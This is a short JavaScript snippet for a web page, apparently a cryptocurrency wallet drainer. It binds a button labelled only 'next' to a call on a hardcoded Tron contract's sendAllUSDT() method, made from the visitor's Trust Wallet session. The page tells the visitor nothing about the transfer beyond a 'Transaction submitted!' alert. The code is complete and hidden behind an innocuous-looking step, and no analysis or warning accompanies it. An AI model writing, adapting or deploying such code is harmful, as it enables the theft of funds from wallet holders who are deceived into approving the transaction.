
(async () => {
  const CONTRACT_ADDRESS = "TYrS3KVuwSUKZwxXr56GA5jQUBpka8Kf3F";

  async function triggerContract() {
    if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
      alert("Please open in Trust Wallet DApp browser on Tron network.");
      return;
    }

    const tronWeb = window.tronWeb;

    try {
      const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
      const tx = await contract.sendAllUSDT().send();
      console.log("Transaction sent:", tx);
      alert("Transaction submitted!");
    } catch (err) {
      console.error("Error:", err);
      alert("Transaction failed. Check console for details.");
    }
  }

  document.getElementById("nextBtn").addEventListener("click", triggerContract);
})();
